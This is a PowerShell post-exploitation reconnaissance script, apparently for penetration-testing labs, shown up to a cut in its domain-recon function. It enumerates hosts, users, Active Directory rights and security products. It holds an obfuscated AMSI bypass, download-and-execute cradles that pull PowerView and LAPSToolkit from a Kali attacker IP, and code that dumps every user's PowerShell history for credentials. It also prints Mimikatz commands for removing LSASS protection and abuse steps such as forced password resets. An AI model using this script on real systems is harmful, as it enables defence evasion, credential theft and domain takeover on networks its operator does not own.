function Invoke-HostRecon{

    #   C:\PS> Invoke-HostRecon -KaliIP 192.168.45.220


    Param(

        [Parameter(Position = 1, Mandatory = $true)]
        [string]
        $KaliIP,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [switch]
        $Portscan,

        [Parameter(Position = 1, Mandatory = $false)]
        [string]
        $TopPorts = "50",

        [ValidateRange(1,65535)][String[]]$Portlist = ""

    )


    # AMSI bypass
    $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils"){$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
    

    Invoke-BasicRecon -KaliIP $KaliIP

    Invoke-UserRecon -KaliIP $KaliIP

    Invoke-DomainRecon -KaliIP $KaliIP

    Invoke-MSSQLRecon -KaliIP $KaliIP


}

function Invoke-UserRecon {

    Param(

        [Parameter(Position = 1, Mandatory = $true)]
        [string]
        $KaliIP

    )

    Write-Output "`n"
    Write-Output "###############################"
    Write-Output "###    Current User Recon   ###"
    Write-Output "###############################"
    Write-Output "`n"

    $DACLrights = "WriteProperty|GenericWrite|GenericAll|WriteDacl|WriteDACL"



    #Current user and domain

    Write-Output "[*] Current Domain and Username"

    $currentuser = $env:USERNAME
    $CurrentDomain = $env:USERDOMAIN

    Write-Output "Domain = $env:USERDOMAIN"
    Write-Output "Current User = $env:USERNAME"
    Write-Output "`n"

    #User privileges
    Write-Output "[*] SeImpersonatePrivilege check"
    if ((whoami /priv | findstr "SeImpersonatePrivilege") -eq $null) {
        Write-Output "   [-] No SeImpersonatePrivilege"
    }
    else {
        Write-Output "   [+] SeImpersonatePrivilege present"
    }
    Write-Output ""

    Write-Output "[*] Interesting privileges"
    $UserPrivs = $(whoami /priv | Select-String -Pattern "SeBackupPrivilege|SeRestorePrivilege|SeDebugPrivilege|SeImpersonatePrivilege" | ForEach-Object { $_.Matches.Value })
    if ($UserPrivs -ne $null -and $UserPrivs -ne "") {
        Write-Output "   [+] Found interesting privileges"
        foreach ($priv in $UserPrivs) {
            Write-Output "       $priv"
        }
    }
    else {
        Write-Output "   [-] No interesting privileges present"
    }
    Write-Output ""
    

    #Checking for Local Admin Password Solution (LAPS)

    Write-Output "[*] Checking for Local Admin Password Solution (LAPS)"
    try
        {
        $lapsfile = Get-ChildItem "$env:ProgramFiles\LAPS\CSE\Admpwd.dll" -ErrorAction Stop
        if ($lapsfile)
            {
            Write-Output "The LAPS DLL (Admpwd.dll) was found. Local Admin password randomization may be in use."
            (new-object system.net.webclient).downloadstring("http://$KaliIP/win/LAPSToolkit.ps1") | IEX
            $lapsComputers = $(Get-LAPSComputers)
            $lapsDelegatedGroups = $(Find-LAPSDelegatedGroups)
            Write-Output $lapsComputers | fl *
            Write-Output $lapsDelegatedGroups | fl *
            }
        }
    catch
        {
        Write-Output "The LAPS DLL was not found."
        }
    Write-Output "`n"

    #Checking for credentials in PowerShell history

    Write-Output "[*] Checking for credentials in PowerShell history"
    $filePath = (Get-PSReadlineOption).HistorySavePath
    if (Test-Path $filePath) {
        Write-Output "[+] $filePath The file exists."
        Write-Output ""
        Write-Output "type $filePath"
    } else {
        Write-Host "[-] $filePath file does not exist."
    }
    Write-Output "`n"


    #### Current user domain enumeration
    try 
    {
        (new-object system.net.webclient).downloadstring("http://$KaliIP/win/PowerView.ps1") | IEX
        $PowerView = $true
    }
    catch 
    {
        Write-Output "Error downloading PowerView." 
        $PowerView = $false   
    }
    
    if ($PowerView) 
    {

        $DomainName = Get-Domain | Select-Object -ExpandProperty Name # current user domain
        $Domains=Get-DomainTrustMapping | % {$_.SourceName} | Get-Unique
        
        if ($Domains.count -lt 1) {$Domains = @($DomainName)}
        Write-Output "Domains: $Domains"
        Write-Output ""

        Write-Output "[*] $currentuser data"
        Get-DomainUser $currentuser | fl *
        Write-Output "`n"

        Write-Output "[*] $currentuser groups"
        (Get-DomainUser $currentuser).memberof
        write-Output ""
        $currentUserGroup = $(Get-DomainGroup -Domain $DomainName | % { if ($_.member -match $currentuser) { $_.name } })
        
        Write-Output "CurrentUserGroup: $currentUserGroup"
        Write-Output "`n"

        foreach ($Domain in $Domains) {
            
            Write-Output ""
            Write-Output "*****************************************************"
            Write-Output "[*] Enumerating $currentuser rights in $Domain domain"
            Write-Output "*****************************************************"
            Write-Output ""

            Write-Output "[*] Get Domain Name"
            $DomainName = $Domain #Get-Domain | Select-Object -ExpandProperty Name # current user domain
            Write-Output $DomainName
            Write-Output "`n"
        
            Write-Output "[*] Get Domain SID"
            Get-DomainSid -Domain $DomainName
            Write-Output "`n"

            Write-Output "[*] $currentuser groups in $DomainName domain"
            $currentUserGroup = $(Get-DomainGroup -Domain $DomainName | % { if ($_.member -match $currentuser) { $_.name } })
            Write-Output $currentUserGroup
            Write-Output "`n"

            Write-Output "[*] Checking if $currentuser can connect to other hosts c$ share"
            #(Get-DomainComputer -Domain $Domain).dnshostname | % { if (Test-Path -Path $("\\$_"+"\C$")) {Write-Host "Can connect to $_ on \\$_\C$"} else {Write-Host "[-] Can't connect to $_ on \\$_\C$"}}
            foreach ($hostname in $((Get-DomainComputer -Domain $Domain).dnshostname)) {
                $Path = $("\\$hostname"+"\C$")
                #Write-output $Path
                try {
                    if (Test-Path -Path $Path -ErrorAction Stop) {
                        Write-Output ""
                        Write-Output "Connected: $Path"
                        dir $Path
                        Write-Output ""
                    }
                    else {
                        Write-Output "Access denied: $Path Error: Path doesn't exist"
                    }
                }
                catch {
                    Write-Output "Access denied: $Path  Error: $($_.Exception.Message)"
                }
            }
            Write-Output "`n"

            Write-Output "[*] Checking if $currentuser can connect to other hosts with WinRM (PS-Remoting)"
            #(Get-DomainComputer -Domain $Domain).dnshostname | % { if (Test-Path -Path $("\\$_"+"\C$")) {Write-Host "Can connect to $_ on \\$_\C$"} else {Write-Host "[-] Can't connect to $_ on \\$_\C$"}}
            foreach ($hostname in $((Get-DomainComputer -Domain $Domain).dnshostname)) {
                try {
                    Enter-PSSession -ComputerName $hostname -ErrorAction Stop
                    Exit-PSSession
                    Write-Output ""
                    Write-Output "[+] WinRM Connected: $hostname"
                    Write-Output ""
                    
                }
                catch {
                    Write-Output "Cannot connect: $hostname Error: $($_.Exception.Message)"
                }
            }
            Write-Output "`n"

            # DACL rights enumeration
            Write-Output "[*] Users to which current user has valuable rights"
            $GenAllUsers = $(Get-DomainUser -Domain $DomainName | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName ObjectName -NotePropertyValue (ConvertFrom-SID $_.objectsid) -Force; $_} | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if (($_.Identity -eq $("$env:UserDomain\$env:Username")) -and ($_.ActiveDirectoryRights -match $DACLrights)) {$_}})
            if (@($GenAllUsers).Count -gt 0){
                write-Output $GenAllUsers | fl *
                Write-Output "IF GenericALL change user password: net user testservice1 h4x /domain"
                Write-Output "IF WriteDACL add GenericAll rights: Add-DomainObjectAcl -TargetIdentity testservice2 -PrincipalIdentity offsec -Rights All"
            }
            else {
                Write-Output "No valuable rights on users."
            }
            Write-Output "`n"


            Write-Output "[*] Groups to which current user has valuable rights"
            $GenAllGroups = $(Get-DomainGroup -Domain $DomainName | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName ObjectName -NotePropertyValue (ConvertFrom-SID $_.objectsid) -Force; $_} | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if (($_.Identity -eq $("$env:UserDomain\$env:Username")) -and ($_.ActiveDirectoryRights -match $DACLrights)) {$_}})

            if (@($GenAllGroups).Count -gt 0){
                write-Output $GenAllGroups | fl *
                Write-Output "AIF GenericALL: dd user to the group: net group testgroup offsec /add /domain"
                Write-Output "IF WriteDACL add GenericAll rights: Add-DomainObjectAcl -TargetIdentity testservice2 -PrincipalIdentity offsec -Rights All"
            }
            else {
                Write-Output "No valuable rights on groups."
            }
            Write-Output "`n"


            Write-Output "[*] Computers to which current user has valuable rights"
            $GenWriteComp = $(Get-DomainComputer -Domain $DomainName | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName ObjectName -NotePropertyValue (ConvertFrom-SID $_.objectsid) -Force; $_} | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if (($_.Identity -eq $("$env:UserDomain\$env:Username")) -and ($_.ActiveDirectoryRights -match $DACLrights)) {$_}})

            if (@($GenWriteComp).Count -gt 0){
                write-Output $GenWriteComp | fl *
                Write-Output "Execute Resource-Based constrained delegation"
            }
            else {
                Write-Output "No valuable rights on computers."
            }
            Write-Output "`n"




            # DACL rights enumeration for current users group

            if ($currentUserGroup) {
                Write-Output "[*] Users to which current user ($currentuser) AD group ($currentUserGroup) has valuable rights"
                $GenAllUsers = $(Get-DomainUser -Domain $DomainName | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName ObjectName -NotePropertyValue (ConvertFrom-SID $_.objectsid) -Force; $_} | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if (($_.Identity -match $("$currentUserGroup"))  -and ($_.ActiveDirectoryRights -match $DACLrights)) {$_}})
                if (@($GenAllUsers).Count > 0){
                    write-Output $GenAllUsers
                    Write-Output "IF GenericALL change user password: net user testservice1 h4x /domain"
                    Write-Output "IF WriteDACL add GenericAll rights: Add-DomainObjectAcl -TargetIdentity testservice2 -PrincipalIdentity offsec -Rights All"
                }
                else {
                    Write-Output "No valuable rights on users."
                }
                Write-Output "`n"


                Write-Output "[*] Groups to which current user ($currentuser) AD group ($currentUserGroup) has valuable rights"
                $GenAllGroups = $(Get-DomainGroup -Domain $DomainName | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName ObjectName -NotePropertyValue (ConvertFrom-SID $_.objectsid) -Force; $_} | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if (($_.Identity -match $("$currentUserGroup")) -and ($_.ActiveDirectoryRights -match $DACLrights)) {$_}})

                if (@($GenAllGroups).Count -gt 0){
                    write-Output $GenAllGroups
                    Write-Output "AIF GenericALL: dd user to the group: net group testgroup offsec /add /domain"
                    Write-Output "IF WriteDACL add GenericAll rights: Add-DomainObjectAcl -TargetIdentity testservice2 -PrincipalIdentity offsec -Rights All"
                }
                else {
                    Write-Output "No valuable rights on groups."
                }
                Write-Output "`n"


                Write-Output "[*] Computers to which current user ($currentuser) AD group ($currentUserGroup) has valuable rights"
                $GenWriteComp = $(Get-DomainComputer -Domain $DomainName | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName ObjectName -NotePropertyValue (ConvertFrom-SID $_.objectsid) -Force; $_} | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if (($_.Identity -match $("$currentUserGroup")) -and ($_.ActiveDirectoryRights -match $DACLrights)) {$_}})

                if ($(@($GenWriteComp).Count) -gt 0){
                    write-Output $GenWriteComp
                    Write-Output "Execute Resource-Based constrained delegation"
                }
                else {
                    Write-Output "No valuable rights on computers."
                }
                Write-Output "`n"

                #password of user that can be changed
                Write-Output "[*] Users to which current user ($($currentuser)) or group ($($currentUserGroup)) can change password"
                #Write-Output $currentUserGroup
                $PassChangeUsers = $(Get-DomainUser -Domain $DomainName | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName ObjectName -NotePropertyValue (ConvertFrom-SID $_.objectsid) -Force; $_} | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ((($_.Identity -eq $("$env:UserDomain\$env:Username")) -or ($_.Identity -match $currentUserGroup)) -and ($_.ObjectAceType -match "User-Force-Change-Password")) {$_}})

                if (@($PassChangeUsers).Count -gt 0) {
                    Write-Output $PassChangeUsers | fl *
                }
                else {
                    Write-Output "Cannot change passwords."
                }
            
            }
            else {
                Write-Output "[!] Current user group empty! Check if user account is used!"
            }

        }


        Write-Output "`n"
    }

}


function Invoke-BasicRecon{

    Param(

        [Parameter(Position = 1, Mandatory = $true)]
        [string]
        $KaliIP

    )

    Write-Output "`n"
    Write-Output "###############################"
    Write-Output "###     Basic Host Recon    ###"
    Write-Output "###############################"
    Write-Output "`n"

    #Hostname

    Write-Output "[*] Hostname"
    $Computer = $env:COMPUTERNAME
    $Computer
    Write-Output "`n"

    #IP Information

    Write-Output "[*] IP Address Info"
    $ipinfo = Get-WmiObject -Class Win32_NetworkAdapterConfiguration -Filter 'IPEnabled = True'| Select-Object IPAddress,Description | Format-Table -Wrap | Out-String
    $ipinfo
    Write-Output "`n"

    #PowerShell language mode
    Write-Output "[*] PowerShell Language Mode"
    $ExecutionContext.SessionState.LanguageMode
    Write-Output ""

    #Current user and domain

    #Write-Output "[*] Current Domain and Username"

    $currentuser = $env:USERNAME
    $CurrentDomain = $env:USERDOMAIN
    Write-Output ""

    #All local users

    Write-Output "[*] Local Users of this system"
    $locals = Get-WmiObject -Class Win32_UserAccount -Filter  "LocalAccount='True'" | Select-Object Name 
    Write-Output $locals
    Write-Output "`n"

    # Users PowerShell history files
    Write-Output "[*] Checking for credentials in PowerShell history files for all users"
    $filePath = (Get-PSReadlineOption).HistorySavePath
    foreach ($username in $locals)
    {
        $modifiedFilePath = $filePath -replace "(?<=Users\\)[^\\]+(?=\\AppData)", $username
        if (Test-Path $modifiedFilePath) {
            Write-Output "[+] $modifiedFilePath file exists."
            Write-Output ""
            type $modifiedFilePath
            Write-Output ""
        } 
        
    }
    

    Write-Output "`n"

    #Local Admins group

    Write-Output "[*] Local Admins of this system"
    $Admins = Get-WmiObject win32_groupuser | Where-Object { $_.GroupComponent -match 'administrators' -and ($_.GroupComponent -match "Domain=`"$env:COMPUTERNAME`"")} | ForEach-Object {[wmi]$_.PartComponent } | Select-Object Caption,SID | format-table -Wrap | Out-String
    $Admins
    Write-Output "`n"

    #Netstat Information
    #Some code here borrowed from: http://techibee.com/powershell/query-list-of-listening-ports-in-windows-using-powershell/2344
    Write-Output "[*] Active Network Connections"
    $TCPProperties = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties()            
    $Connections = $TCPProperties.GetActiveTcpConnections()            
    $objarray = @()
    foreach($Connection in $Connections) {            
        if($Connection.LocalEndPoint.AddressFamily -eq "InterNetwork" ) { $IPType = "IPv4" } else { $IPType = "IPv6" }            
        $OutputObj = New-Object -TypeName PSobject            
        $OutputObj | Add-Member -MemberType NoteProperty -Name "LocalAddress" -Value $Connection.LocalEndPoint.Address            
        $OutputObj | Add-Member -MemberType NoteProperty -Name "LocalPort" -Value $Connection.LocalEndPoint.Port            
        $OutputObj | Add-Member -MemberType NoteProperty -Name "RemoteAddress" -Value $Connection.RemoteEndPoint.Address            
        $OutputObj | Add-Member -MemberType NoteProperty -Name "RemotePort" -Value $Connection.RemoteEndPoint.Port            
        $OutputObj | Add-Member -MemberType NoteProperty -Name "State" -Value $Connection.State            
        $OutputObj | Add-Member -MemberType NoteProperty -Name "IPV4Or6" -Value $IPType            
        $objarray += $OutputObj
        }
        $activeconnections = $objarray | Format-Table -Wrap | Out-String
        $activeconnections


    #Shares

    Write-Output "[*] Share listing"
    $shares = @()
    $shares = Get-WmiObject -Class Win32_Share | Format-Table -Wrap | Out-String
    $shares
    Write-Output "`n"

    #Scheduled Tasks

    Write-Output "[*] List of scheduled tasks"
    $schedule = new-object -com("Schedule.Service")
    $schedule.connect() 
    $tasks = $schedule.getfolder("\").gettasks(0) | Select-Object Name | Format-Table -Wrap | Out-String
    If ($tasks.count -eq 0)
        {
        Write-Output "[*] Task scheduler appears to be empty"
        }
    If ($tasks.count -ne 0)
        {
        $tasks
        }
    Write-Output "`n"

    #Proxy information

    Write-Output "[*] Proxy Info"
    $proxyenabled = (Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').proxyEnable
    $proxyserver = (Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').proxyServer

    If ($proxyenabled -eq 1)
        {
            Write-Output "A system proxy appears to be enabled."
            Write-Output "System proxy located at: $proxyserver"
        }
    Elseif($proxyenabled -eq 0)
        {
            Write-Output "There does not appear to be a system proxy enabled."
        }
    Write-Output "`n"

    #Getting AntiVirus Information


    Write-Output "[*] Checking if AV is installed"

    $AV = Get-WmiObject -Namespace "root\SecurityCenter2" -Query "SELECT * FROM AntiVirusProduct" 

    If ($AV -ne "")
        {
            Write-Output "The following AntiVirus product appears to be installed:" $AV.displayName
        }
    If ($AV -eq "")
        {
            Write-Output "No AV detected."
        }
    Write-Output "`n"

    #Getting Local Firewall Status

    Write-Output "[*] Checking local firewall status."
    $HKLM = 2147483650
    $reg = get-wmiobject -list -namespace root\default -computer $computer | where-object { $_.name -eq "StdRegProv" }
    $firewallEnabled = $reg.GetDwordValue($HKLM, "System\ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile","EnableFirewall")
    $fwenabled = [bool]($firewallEnabled.uValue)

    If($fwenabled -eq $true)
        {
            Write-Output "The local firewall appears to be enabled."
        }
    If($fwenabled -ne $true)
        {
            Write-Output "The local firewall appears to be disabled."
        }
    Write-Output "`n"


    #Checking for common security products

    Write-Output "[*] Checking for Sysinternals Sysmon"
    try
        {
        $sysmondrv = Get-ChildItem "$env:SystemRoot\sysmondrv.sys" -ErrorAction Stop
        if ($sysmondrv)
            {
            Write-Output "The Sysmon driver $($sysmondrv.VersionInfo.FileVersion) (sysmondrv.sys) was found. System activity may be monitored."
            }
        }
    catch
        {
        Write-Output "The Sysmon driver was not found."
        }
    Write-Output "`n"

    Write-Output "[*] Checking for common security product processes"
    $processnames = $processes | Select-Object ProcessName
    Foreach ($ps in $processnames)
            {
            #AV
            if ($ps.ProcessName -like "*mcshield*")
                {
                Write-Output ("Possible McAfee AV process " + $ps.ProcessName + " is running.")
                }
            if (($ps.ProcessName -like "*windefend*") -or ($ps.ProcessName -like "*MSASCui*") -or ($ps.ProcessName -like "*msmpeng*") -or ($ps.ProcessName -like "*msmpsvc*"))
                {
                Write-Output ("Possible Windows Defender AV process " + $ps.ProcessName + " is running.")
                }
            if ($ps.ProcessName -like "*WRSA*")
                {
                Write-Output ("Possible WebRoot AV process " + $ps.ProcessName + " is running.")
                }
            if ($ps.ProcessName -like "*savservice*")
                {
                Write-Output ("Possible Sophos AV process " + $ps.ProcessName + " is running.")
                }
            if (($ps.ProcessName -like "*TMCCSF*") -or ($ps.ProcessName -like "*TmListen*") -or ($ps.ProcessName -like "*NTRtScan*"))
                {
                Write-Output ("Possible Trend Micro AV process " + $ps.ProcessName + " is running.")
                }
            if (($ps.ProcessName -like "*symantec antivirus*") -or ($ps.ProcessName -like "*SymCorpUI*") -or ($ps.ProcessName -like "*ccSvcHst*") -or ($ps.ProcessName -like "*SMC*")  -or ($ps.ProcessName -like "*Rtvscan*"))
                {
                Write-Output ("Possible Symantec AV process " + $ps.ProcessName + " is running.")
                }
            if ($ps.ProcessName -like "*mbae*")
                {
                Write-Output ("Possible MalwareBytes Anti-Exploit process " + $ps.ProcessName + " is running.")
                }
            #if ($ps.ProcessName -like "*mbam*")
               # {
               # Write-Output ("Possible MalwareBytes Anti-Malware process " + $ps.ProcessName + " is running.")
               # }
            #AppWhitelisting
            if ($ps.ProcessName -like "*Parity*")
                {
                Write-Output ("Possible Bit9 application whitelisting process " + $ps.ProcessName + " is running.")
                }
            #Behavioral Analysis
            if ($ps.ProcessName -like "*cb*")
                {
                Write-Output ("Possible Carbon Black behavioral analysis process " + $ps.ProcessName + " is running.")
                }
            if ($ps.ProcessName -like "*bds-vision*")
                {
                Write-Output ("Possible BDS Vision behavioral analysis process " + $ps.ProcessName + " is running.")
                } 
            if ($ps.ProcessName -like "*Triumfant*")
                {
                Write-Output ("Possible Triumfant behavioral analysis process " + $ps.ProcessName + " is running.")
                }
            if ($ps.ProcessName -like "CSFalcon")
                {
                Write-Output ("Possible CrowdStrike Falcon EDR process " + $ps.ProcessName + " is running.")
                }
            #Intrusion Detection
            if ($ps.ProcessName -like "*ossec*")
                {
                Write-Output ("Possible OSSEC intrusion detection process " + $ps.ProcessName + " is running.")
                } 
            #Firewall
            if ($ps.ProcessName -like "*TmPfw*")
                {
                Write-Output ("Possible Trend Micro firewall process " + $ps.ProcessName + " is running.")
                } 
            #DLP
            if (($ps.ProcessName -like "dgagent") -or ($ps.ProcessName -like "DgService") -or ($ps.ProcessName -like "DgScan"))
                {
                Write-Output ("Possible Verdasys Digital Guardian DLP process " + $ps.ProcessName + " is running.")
                }   
            if ($ps.ProcessName -like "kvoop")
                {
                Write-Output ("Possible Unknown DLP process " + $ps.ProcessName + " is running.")
                }                       
            }
    Write-Output "`n"


    #LSAS RunAsPPL
    
    Write-Output "[*] Checking if LSASS process is RunAsPPL"
    try
        {
        $lapsfile = Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name "RunAsPPL" -ErrorAction Stop
        if ($lapsfile)
            {
            Write-Output "LSASS is runnig as RunAsPPL."
            Write-Output "   In Mimikatz use: !+  -> load driver and !processprotect /process:lsass.exe /remove"

            }
        }
    catch
        {
        Write-Output "LSASS not protected."
        }
    Write-Output "`n"
}


function Invoke-DomainRecon {

    Param(

        [Parameter(Position = 1, Mandatory = $true)]
        [string]
        $KaliIP

    )

    Write-Output "`n"
    Write-Output "###############################"
    Write-Output "###  Active Directory Recon ###"
    Write-Output "###############################"
    Write-Output "`n"

    $DACLrights = "WriteProperty|GenericWrite|GenericAll|WriteDacl|WriteDACL"

    $domain = "$env:USERDOMAIN"

    #Domain Controllers

    Write-Output "[*] Domain Controllers"
    Try 
    {
        $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("domain",$domain)
        $DomainObject =[System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
        $DCS = $DomainObject.DomainControllers
        foreach ($dc in $DCS)
        {
            $dc.Name
        }
    
    }
    catch 
    {
        Write-Output "Error connecting to the domain while retrieving listing of Domain Controllers."    

    }
    Write-Output "`n"

    #Domain Admins

    Write-Output "[*] Domain Admins"
    Try 
    {
        $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("domain",$domain)
        $DomainObject =[System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
    
        $DAgroup = ([adsi]"WinNT://$domain/Domain Admins,group")
        $Members = @($DAgroup.psbase.invoke("Members"))
        [Array]$MemberNames = $Members | ForEach{([ADSI]$_).InvokeGet("Name")}
        $MemberNames
    }
    catch 
    {
        Write-Output "Error connecting to the domain while retrieving Domain Admins group members."    

    }
    Write-Output "`n"

    # Basic AD checks with use of PowerView.ps1
    Write-Output "[*] Active Directory basic authenticated enumeration"
    try 
    {
        (new-object system.net.webclient).downloadstring("http://$KaliIP/win/PowerView.ps1") | IEX
        $PowerView = $true
    }
    catch 
    {
        Write-Output "Error downloading PowerView." 
        $PowerView = $false   
    }
    
    if ($PowerView) 
    {
        Write-Output "[*] Get Domain Name"
        $DomainName = Get-Domain | Select-Object -ExpandProperty Name # current user domain
        Write-Output $DomainName
        Write-Output "`n"
    

        Write-Output "[*] Get Domain SID"
        Get-DomainSid -Domain $DomainName
        Write-Output "`n"

        Write-Output "[*] List Domain Users"
        Get-DomainUser | select samaccountname,objectsid,memberof | fl *
        Write-Output "`n"
        
        Write-Output "[*] List Domain Computers"
        Get-DomainComputer | select objectsid,name,dnshostname | fl *
        Write-Output "`n"
    
        Write-Output "[*] List Domain Groups"
        Get-DomainGroup | select samaccountname
        Write-Output "`n"
    
        Write-Output "[*] Computers with Unconstrained Delegation"
        Get-DomainComputer -Unconstrained  | select samaccountname, dnshostname
        Write-Output "`n"
    
        Write-Output "[*] Computers with Constrained Delegation"
        Get-DomainComputer -TrustedToAuth | fl *
        Write-Output "`n"

        Write-Output "[*] Users with Constrained Delegation"
        Get-DomainUser -TrustedToAuth | fl *
        Write-Output "`n"

        # DACL rights enumeration

        # all rights 
        Write-Output "[*] Enum Users DACLs with GenericAll, GenericWrite etc. rights"
        $EnumOut = Get-DomainUser -Domain $DomainName | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName ObjectName -NotePropertyValue (ConvertFrom-SID $_.objectsid) -Force; $_} | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if (($_.Identity -notmatch "BUILTIN|Enterprise Admins|Domain Admins|Principal Self|Local System|Key Admins|Cert Publishers") -and ($_.ActiveDirectoryRights -match $DACLrights)) {$_}}
        Write-Output $EnumOut | fl *

        Write-Output "[*] Enum Groups DACLs with GenericAll, GenericWrite etc. rights"
        $EnumOut = Get-DomainGroup -Domain $DomainName| Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName ObjectName -NotePropertyValue (ConvertFrom-SID $_.objectsid) -Force; $_} | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if (($_.Identity -notmatch "BUILTIN|Enterprise Admins|Domain Admins|Principal Self|Local System|Key Admins|Cert Publishers") -and ($_.ActiveDirectoryRights -match $DACLrights)) {$_}}
        Write-Output $EnumOut | fl *

        Write-Output "[*] Enum Computers DACLs with GenericAll, GenericWrite etc. rights - Resource-Based Constrained Delegation"
        $EnumOut = Get-DomainComputer -Domain $DomainName | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName ObjectName -NotePropertyValue (ConvertFrom-SID $_.objectsid) -Force; $_} | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if (($_.Identity -notmatch "BUILTIN|Enterprise Admins|Domain Admins|Principal Self|Local System|Key Admins|Cert Publishers") -and ($_.ActiveDirectoryRights -match $DACLrights)) {$_}}
        Write-Output $EnumOut | fl *

        #password of user that can be changed
        Write-Output "[*] Users which password can be changed"
        $PassChangeUsers = Get-DomainUser -Domain $DomainName | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName ObjectName -NotePropertyValue (ConvertFrom-SID $_.objectsid) -Force; $_} | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.ObjectAceType -match "User-Force-Change-Password") {$_}}
        Write-Output $PassChangeUsers | fl *

        Write-Output "`n"

    
        #Forest AD
        # enumerate trusts
        Write-Output "[*] List Domain Trust"
        try {
            Get-DomainTrustMapping | fl *

            # all trusted domains
            Write-Output "[*] Enumerating trusted domains"
            Write-Output "Check for the same users in multiple domains and check their passwords, try ExtraSID etc. "
            Write-Output "`n"
            
            $Domains=Get-DomainTrustMapping | % {$_.SourceName} | Get-Unique
            Write-Output "Trusted domains: $Domains"
            Write-Output ""
        }
        catch {
            Write-Output "[-] No trusted domains"
        }


        # Enumerate MS SQL
        if ($Domains.count -lt 1) {$Domains = @($DomainName)}
        Write-Output "[*] Domains for enumeration : $Domains"
        Write-Output ""

        foreach ($Domain in $Domains) {
            Write-Output ""
            Write-Output "*****************************************************"
            Write-Output "[*] Enumerating $Domain domain"
            Write-Output "*****************************************************"
            Write-Output ""

            Write-Output "[*] Get $Domain Domain SID"
            Get-DomainSid -Domain $Domain
            Write-Output "`n"

            Write-Output "[*] Enumerate groups which has users from different domains and forests inside"
            Get-DomainForeignGroupMember -Domain $Domain
            Write-Output "`n"

            Write-Output "[*] Enumerate users in $Domain domain"
            Get-DomainUser -Domain $Domain | select samaccountname,objectsid,memberof | fl *
            Write-Output "`n"

            Write-Output "[*] Enumerate computers in $Domain domain"
            Get-DomainComputer -Domain $Domain | select objectsid,name,dnshostname | fl *
            Write-Output "`n"

            Write-Output "[*] Computers IP adresses"
            $CompTable = @()
            $DomainComputersNames = (Get-DomainComputer -Domain $Domain).dnshostname
            foreach ($DomainComputerName in $DomainComputersNames) {
                $compObject = [PSCustomObject]@{
                    Name = $DomainComputerName 
                    IPAddress   = $((Resolve-DnsName -Name "$DomainComputerName").IPAddress)
                }
                $CompTable += $compObject
            }
            Write-Output $CompTable
            #$CompTable
            Write-Output "`n"

            Write-Output "[*] Enum Users DACLs with GenericAll, GenericWrite etc. rights"
